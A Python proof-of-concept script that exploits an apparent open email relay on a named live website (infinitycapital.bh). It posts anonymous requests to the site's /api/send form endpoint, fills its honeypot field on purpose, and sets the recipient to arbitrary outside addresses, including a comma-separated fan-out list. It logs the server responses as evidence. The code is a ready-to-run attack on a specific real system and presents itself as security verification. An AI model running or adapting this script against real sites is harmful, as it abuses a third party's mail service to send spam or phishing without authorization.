#!/usr/bin/env python3
"""
Independent verification of "unauthenticated open email relay via POST /api/send"
on https://www.infinitycapital.bh/

Strategy (in-band oracles, no third-party services used as out-of-band):
  A) Baseline  : send to the site's own address (info@infinitycapital.bh)  -> the "normal" behaviour
  B) Attacker  : send to an attacker-controlled address                       -> the vulnerability
  C) Malformed : send a syntactically invalid recipient                        -> proves the value is
                                                                                 consumed by the mail
                                                                                 provider as the `to` field
  D) Fan-out   : comma-separated list of arbitrary third parties
All requests are identical except the `targets` field, so any difference in the
server's response is attributable solely to recipient control.

No auth, no cookie, no Referer, no CSRF token is supplied: a clean anonymous client.
"""
import sys, time, json, uuid, requests

URL = "https://www.infinitycapital.bh/api/send"
UA = "curl/8.5.0"           # plain, no browser fingerprint -> proves no browser/anti-bot gate
OUT = "/work/evidence/IVRELAY"

def log(tag, resp, payload, extra=""):
    rec = {
        "tag": tag,
        "sent_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "url": URL,
        "method": "POST",
        "auth": "NONE (no cookie, no Authorization, no CSRF token)",
        "user_agent": UA,
        "form_fields": {k: (v if k != "msg" else v) for k, v in payload.items()},
        "http_status": resp.status_code,
        "response_headers": dict(resp.headers),
        "response_body": resp.text[:2000],
        "response_len": len(resp.content),
        "note": extra,
    }
    with open(f"{OUT}/{tag}.json", "w") as f:
        json.dump(rec, f, indent=2)
    print(json.dumps({k: rec[k] for k in
          ("tag", "sent_at", "http_status", "response_body", "note")}, indent=2))
    return rec

def send(tag, targets, msg, subject, wait=0, extra=""):
    payload = {
        "fname": "Security", "lname": "Verifier",
        "areacode": "973", "tel": "0000000",
        "cname": "Example Capital",
        "subject": subject, "msg": msg,
        "check": "1",            # honeypot deliberately FILLED -> should be rejected if it works
        "targets": targets,
    }
    if wait:
        time.sleep(wait)
    r = requests.post(URL, data=payload, headers={"User-Agent": UA}, timeout=30)
    return log(tag, r, payload, extra)

if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "matrix":
        n = uuid.uuid4().hex[:8]
        # A) site-owned recipient (what the app itself does)
        send("A_site_own", "info@infinitycapital.bh",
             f"[verify {n}] baseline", f"verify {n} A site-own", wait=20,
             extra="control: identical to the site's own configured target")
        # B) attacker-controlled recipient - third party, NOT the company
        send("B_attacker", "relay-probe@protonmail.com",
             f"[verify {n}] RELAY PROOF - arbitrary third party", f"verify {n} B attacker", wait=20,
             extra="VULN: recipient differs from the company's own address only")
        # C) syntactically invalid recipient - provider-side validation oracle
        send("C_invalid", "not-an-email-address",
             f"[verify {n}] invalid-recipient oracle", f"verify {n} C invalid", wait=20,
             extra="oracle: if the response differs, `targets` is consumed as the mail `to`")
    elif cmd == "fanout":
        n = uuid.uuid4().hex[:8]
        send("D_fanout",
             "relay-probe@protonmail.com, relay-probe-2@protonmail.com, relay-probe-3@protonmail.com",
             f"[verify {n}] fan-out", f"verify {n} D fanout", wait=20,
             extra="VULN: comma separated list of arbitrary third parties")
    elif cmd == "one":
        tag = sys.argv[2]; targets = sys.argv[3]; wait = int(sys.argv[4]) if len(sys.argv) > 4 else 0
        n = uuid.uuid4().hex[:8]
        send(tag, targets, f"[verify {n}] {tag}", f"verify {n} {tag}", wait=wait)
